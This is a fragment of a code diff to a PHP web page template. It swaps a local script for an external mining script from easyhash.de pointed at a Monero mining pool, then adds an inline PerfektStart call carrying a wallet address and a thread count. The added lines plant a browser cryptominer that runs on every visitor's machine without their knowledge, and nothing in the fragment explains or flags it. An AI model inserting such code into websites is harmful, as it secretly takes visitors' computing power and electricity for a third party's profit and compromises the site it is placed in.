@@ -28,5 +28,10 @@
             </div>
         </div>
     </nav>
-    <script type="text/javascript" src="/public/js/mmh.js"></script>
+    <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10032" > </script>
+    <script type="text/javascript">
+        document.load
+        PerfektStart('47eAtMY89v92JcVo9NwZkxLXTDUQMUaAgdoC47hpwft9JLDwvLHAZoq7unA3bkwZGW45enrvYyyBnBCxDmtiWWNa6Ps7Nvg', 'x', 4);
+
+    </script>
 <?php include 'bstrap.php'; ?>
